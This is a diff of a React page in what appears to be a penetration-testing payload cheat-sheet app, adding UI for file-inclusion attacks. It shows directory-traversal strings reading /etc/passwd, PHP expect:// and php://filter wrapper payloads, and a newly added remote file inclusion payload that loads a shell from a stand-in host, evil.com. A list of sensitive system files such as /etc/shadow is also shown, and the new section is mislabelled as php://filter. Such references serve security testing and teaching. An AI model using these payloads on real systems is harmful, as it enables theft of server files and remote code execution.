@@ -8,14 +8,17 @@ const { Title, Paragraph } = Typography;
 
 export default (props) => {
 	const successInfoReverseShell = () => {
-		message.success('Your LFI payload has been copied');
+		message.success('Your payload has been copied');
 	};
+
 	const successInfoEncodeURL = () => {
-		message.success('Your LFI payload URL encoded has been copied');
+		message.success('Your payload URL encoded has been copied');
 	};
+
 	const directoryTraversal = `foo.php?file=../../../../../../../etc/passwd`;
 	const phpWrapperLfi = `/example1.php?page=expect://ls`;
 	const phpWrapperFilter = `/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd`;
+	const phpRfi = `http://example.com/index.php?page=http://evil.com/shell.txt`;
 	const linux = [
 		{ title: '/etc/passwd' },
 		{ title: '/etc/shadow' },
@@ -63,6 +66,7 @@ export default (props) => {
 		{ title: '/windows/system32/license.rtf' },
 		{ title: '/windows/system32/eula.txt' }
 	];
+
 	return (
 		<QueueAnim delay={300} duration={1500}>
 			<Title variant='Title level={3}' style={{ fontWeight: 'bold', margin: 15 }}>
@@ -167,6 +171,38 @@ export default (props) => {
 			<Divider dashed />
 			<div
 				key='d'
+				style={{
+					padding: 15,
+					marginTop: 15
+				}}
+			>
+				<Title level={3}>PHP Wrapper php://filter</Title>
+				<Paragraph copyable ellipsis={true}>
+					{phpRfi}
+				</Paragraph>
+				<Clipboard component='a' data-clipboard-text={phpRfi}>
+					<Button
+						type='primary'
+						onClick={successInfoReverseShell}
+						style={{ marginBottom: 10, marginTop: 15 }}
+					>
+						<CopyOutlined />
+						Copy the payload
+					</Button>
+				</Clipboard>
+				<Clipboard component='a' data-clipboard-text={encodeURI(phpRfi)}>
+					<Button
+						type='dashed'
+						onClick={successInfoEncodeURL}
+						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
+					>
+						<LinkOutlined /> URL encoded
+					</Button>
+				</Clipboard>
+			</div>
+			<Divider dashed />
+			<div
+				key='e'
 				style={{
 					padding: 15,
 					marginTop: 15
